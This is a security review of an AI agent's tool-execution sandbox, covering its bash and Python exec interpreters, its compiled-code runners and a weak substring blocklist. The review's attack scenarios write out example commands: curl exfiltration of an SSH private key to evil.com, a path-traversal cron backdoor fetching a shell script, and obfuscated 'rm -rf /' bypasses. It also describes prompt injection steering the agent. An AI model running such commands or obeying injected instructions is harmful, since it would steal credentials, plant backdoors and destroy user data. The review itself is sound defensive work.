# Security Review: Agent Tool Execution Sandbox

Issue: alrobles/agenticSeek#20

## Scope

This review covers all code paths where an LLM-generated response triggers
execution of arbitrary code or commands on the user's machine. The goal is
to catalogue what the current sandbox does and does not protect against, and
to produce actionable recommendations for hardening.

## Executive Summary

| Area | Risk | Severity |
|------|------|----------|
| Python interpreter runs `exec()` with full builtins | Arbitrary code execution | **Critical** |
| Bash interpreter runs `shell=True` subprocess | Arbitrary command execution | **Critical** |
| Safety filter uses substring matching (trivially bypassable) | Filter bypass | **High** |
| `safe_mode` defaults to `False` — safety filter is opt-in | No default protection | **High** |
| No filesystem jail — WORK_DIR is advisory only | File exfiltration / deletion | **High** |
| No network egress controls | Data exfiltration | **Medium** |
| C/Go/Java interpreters compile and run arbitrary code | Native code execution | **Critical** |
| AgenticPlug connector has local allowlist | Properly sandboxed | **Low** |

**Bottom line:** The current execution model trusts the LLM completely.
If the LLM is compromised, confused, or prompt-injected, it can execute
arbitrary system commands, read/write any file the process owner can access,
and exfiltrate data over the network. This is consistent with upstream
AgenticSeek's design as a local-only tool, but must be addressed before
any multi-user, network-exposed, or cluster-connected deployment.

---

## Component Analysis

### 1. BashInterpreter (`sources/tools/BashInterpreter.py`)

**How it works:**
- LLM output containing ` ```bash ` blocks is extracted and executed via
  `subprocess.Popen(command, shell=True)`.
- Each command is prefixed with `cd {work_dir} &&` but this is trivially
  escaped (e.g., `; cd / && rm -rf /`).

**Safety filter:**
- `is_any_unsafe(commands)` checks if any command *contains* a substring
  from `unsafe_commands_unix` or `unsafe_commands_windows`.
- The filter is **only active when `self.safe_mode is True`**, which
  defaults to `False`.

**Findings:**

| ID | Finding | Severity | Bypass |
|----|---------|----------|--------|
| B1 | `safe_mode` defaults to `False` | High | N/A — filter is off by default |
| B2 | Substring matching is trivially bypassable | High | `r m -rf /` (space), `$(rm -rf /)`, base64 decode piping, aliases |
| B3 | `shell=True` enables shell metacharacters | Critical | `; && \|\| $() \`\`` all work |
| B4 | `cd {work_dir} &&` prefix is not a jail | High | Absolute paths, `../`, shell escapes all bypass it |
| B5 | No output size limit | Medium | Infinite output can OOM the process |
| B6 | `"git"` is in the unsafe list — blocks all git commands even safe reads | Low | Overly broad, breaks legitimate workflows |

### 2. PyInterpreter (`sources/tools/PyInterpreter.py`)

**How it works:**
- LLM output containing ` ```python ` blocks is concatenated and run with
  `exec(code, global_vars)`.
- `global_vars` includes `__builtins__`, `os`, and `sys` — full access to
  the Python runtime.

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| P1 | `exec()` with full builtins = arbitrary code execution | Critical |
| P2 | `os` and `sys` explicitly injected into exec scope | Critical |
| P3 | No import restrictions — can import subprocess, socket, urllib, etc. | Critical |
| P4 | No timeout on execution (unlike bash which has a 300s timeout) | Medium |
| P5 | `SystemExit` is caught but other signals are not | Low |
| P6 | No filesystem or network sandboxing | High |

### 3. C Interpreter (`sources/tools/C_Interpreter.py`)

**How it works:**
- LLM output containing ` ```c ` blocks is written to a temp file,
  compiled with `gcc`, and the resulting binary is executed.

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| C1 | Arbitrary native code execution (syscalls, raw memory, network) | Critical |
| C2 | Compilation uses temp directory (good — no persistent artifacts) | Low |
| C3 | 60s compile + 120s run timeout (good — prevents infinite loops) | Low |
| C4 | No seccomp/sandbox on the compiled binary | High |

### 4. Go Interpreter (`sources/tools/GoInterpreter.py`)

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| G1 | Same as C — arbitrary native code from `go build` + run | Critical |
| G2 | 10s timeout for both compile and run (good — aggressive limit) | Low |
| G3 | `GO111MODULE=off` reduces supply-chain attack surface | Low |

### 5. Java Interpreter (`sources/tools/JavaInterpreter.py`)

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| J1 | Same as C/Go — arbitrary JVM code execution | Critical |
| J2 | 10s timeout (good) | Low |
| J3 | Could use Java SecurityManager but doesn't (SecurityManager deprecated in Java 17+) | Medium |

### 6. AgenticPlug Connector (`sources/tools/agenticplug_connector.py`)

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| A1 | Local operation allowlist (`ALLOWED_OPERATIONS` frozenset) — **properly sandboxed** | Low |
| A2 | Write operations gated behind `AGENTICPLUG_WRITE_ENABLED` flag | Low |
| A3 | No raw shell, no file I/O — correct design | Low |
| A4 | Token is read from env (not hardcoded) — correct | Low |

**This is the model for how all tools should work.**

### 7. Safety Module (`sources/tools/safety.py`)

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| S1 | Uses `any(c in cmd for c in unsafe_commands_unix)` — substring match | High |
| S2 | Substring `"rm"` matches `"format"`, `"rm"`, `"firmware"`, etc. | Medium |
| S3 | Missing comma between `"route"` and `"--force"` — they are concatenated | Bug |
| S4 | `"git"` blocks all git operations including safe reads | Medium |
| S5 | No encoding/obfuscation detection (base64, hex, unicode) | High |
| S6 | Entire list is bypassed when `safe_mode=False` (the default) | High |

### 8. Base Tools Class (`sources/tools/tools.py`)

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| T1 | `save_block()` writes to `os.path.join(self.work_dir, save_path_dir)` — no path traversal validation | High |
| T2 | `save_path` comes directly from LLM output (after the `:` in the tag) | High |
| T3 | `os.makedirs(directory)` creates arbitrary directories | Medium |

### 9. Agent Execution Flow (`sources/agents/agent.py`)

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| AG1 | `execute_modules()` iterates all tools and runs any matching blocks | Medium |
| AG2 | No per-tool enable/disable — all tools always active | Medium |
| AG3 | Failed execution feedback is pushed back to LLM memory — good for self-correction but could leak error details | Low |

---

## Attack Scenarios

### Scenario 1: Prompt Injection → Data Exfiltration

An attacker embeds hidden instructions in a webpage or document the agent
processes. The LLM generates:

```bash
curl -s https://evil.com/exfil?data=$(cat ~/.ssh/id_rsa | base64)
```

**Result:** SSH private key exfiltrated. Safety filter does not catch this
because `safe_mode=False` by default, and even if enabled, `curl` is not
in the unsafe list.

### Scenario 2: Path Traversal via save_path

The LLM generates:

```python:../../../../etc/cron.d/backdoor
* * * * * root curl evil.com/shell | bash
```

**Result:** `save_block()` writes to `/etc/cron.d/backdoor` (if running
as root) or to an ancestor directory outside WORK_DIR.

### Scenario 3: Safety Filter Bypass

Even with `safe_mode=True`:

```bash
r''m -rf /
$(echo cm0gLXJmIC8= | base64 -d)
/bin/rm -rf /
```

All three bypass the substring filter.

---

## Recommendations

### P0 — Critical (Must Fix Before Public Alpha)

| # | Recommendation | Effort |
|---|----------------|--------|
| R1 | **Enable `safe_mode` by default.** Change `Tools.__init__` to set `self.safe_mode = True`. Users who want unrestricted execution opt in explicitly. | 1 line |
| R2 | **Validate `save_path` against WORK_DIR.** In `save_block()`, resolve the full path with `os.path.realpath()` and verify it starts with `self.work_dir`. Reject otherwise. | 5 lines |
| R3 | **Fix the concatenated string bug in safety.py.** Add missing comma between `"route"` and `"--force"`. | 1 line |

### P1 — High (Should Fix Before Beta)

| # | Recommendation | Effort |
|---|----------------|--------|
| R4 | **Replace substring matching with token-based command parsing.** Use `shlex.split()` to tokenize commands, then check the first token (the command name) against the blocklist. This prevents false positives and most bypasses. | ~30 lines |
| R5 | **Add network egress monitoring.** Log all outbound connections made during tool execution. Consider blocking known exfiltration patterns (e.g., piping secrets to curl). | Medium |
| R6 | **Add a per-tool enable/disable configuration.** Allow users to disable interpreters they don't need (e.g., disable C/Java if only using Python). | ~20 lines |
| R7 | **Restrict Python exec scope.** Remove `os` and `sys` from `global_vars`. Provide a safe subset of builtins (no `__import__`, `exec`, `eval`, `open`, `compile`). | ~15 lines |

### P2 — Medium (Recommended for Production)

| # | Recommendation | Effort |
|---|----------------|--------|
| R8 | **Run compiled code (C/Go/Java) in a container or namespace.** Use `unshare` or a lightweight container runtime to isolate native code execution. | High |
| R9 | **Add execution output size limits.** Truncate output after a configurable maximum (e.g., 100KB) to prevent OOM. | ~10 lines |
| R10 | **Add Python execution timeout.** Wrap `exec()` in a thread with a timeout, consistent with bash's 300s limit. | ~15 lines |
| R11 | **Audit log all tool executions.** Write a structured log entry for every block executed, including: tool name, code hash, timestamp, success/failure, output size. | ~30 lines |

### P3 — Low (Nice to Have)

| # | Recommendation | Effort |
|---|----------------|--------|
| R12 | **Refine the unsafe command list.** Remove overly broad entries like `"git"`. Replace with specific destructive git commands (`git push --force`, `git reset --hard`). | ~10 lines |
| R13 | **Add a "dry run" mode.** Show the user what would be executed without actually running it, for sensitive operations. | Medium |

---

## What Works Well

1. **AgenticPlug connector** — properly sandboxed with operation allowlist,
   write-gate flag, no raw shell access. This is the correct pattern.
2. **Timeout on bash/C/Go/Java** — prevents infinite loops.
3. **Temp directories for compiled code** — no persistent build artifacts.
4. **`safety` parameter on all `execute()` methods** — infrastructure for
   human-in-the-loop confirmation exists (just not enabled).
5. **`GO111MODULE=off`** — reduces Go supply-chain attack surface.

---

## Risk Matrix

| Risk | Likelihood | Impact | Current Mitigation | Residual Risk |
|------|-----------|--------|-------------------|---------------|
| Prompt injection → shell exec | High | Critical | None (safe_mode off) | **Critical** |
| Path traversal via save_path | Medium | High | None | **High** |
| Data exfiltration via network | Medium | High | None | **High** |
| Safety filter bypass | High | Medium | Substring filter | **Medium** |
| OOM via output flooding | Low | Medium | Bash timeout only | **Low** |
| Supply-chain via Go modules | Low | Medium | GO111MODULE=off | **Low** |

---

## Conclusion

The current tool execution model is appropriate for upstream AgenticSeek's
design goal: a **local, single-user, privacy-first agent** where the user
trusts the LLM and accepts the risk of code execution on their own machine.

For EcoSeek's expanded threat model (multi-mode operation, cluster
connectivity via AgenticPlug, BYOK provider with external API calls), the
sandbox needs hardening. The AgenticPlug connector already demonstrates the
correct pattern: explicit allowlists, no raw shell, fail-closed defaults.

**Recommended implementation order:**
1. R1 + R2 + R3 (P0 fixes — 3 PRs, ~10 lines total)
2. R4 + R7 (safety filter + Python scope restriction)
3. R6 (per-tool enable/disable)
4. R8-R11 as resources allow

---

## Appendix: Files Reviewed

| File | Lines | Purpose |
|------|-------|---------|
| `sources/tools/tools.py` | 219 | Base tool class, block parsing, save_block |
| `sources/tools/safety.py` | 96 | Unsafe command blocklist |
| `sources/tools/BashInterpreter.py` | 123 | Bash command execution |
| `sources/tools/PyInterpreter.py` | 118 | Python exec() execution |
| `sources/tools/C_Interpreter.py` | 121 | C compile-and-run |
| `sources/tools/GoInterpreter.py` | 121 | Go compile-and-run |
| `sources/tools/JavaInterpreter.py` | 187 | Java compile-and-run |
| `sources/tools/agenticplug_connector.py` | 214 | AgenticPlug gateway connector |
| `sources/agents/agent.py` | 286 | Agent base class, execute_modules |
| `sources/agents/code_agent.py` | 91 | Code agent (uses all interpreters) |
| `docs/security-model.md` | 162 | Existing security model documentation |
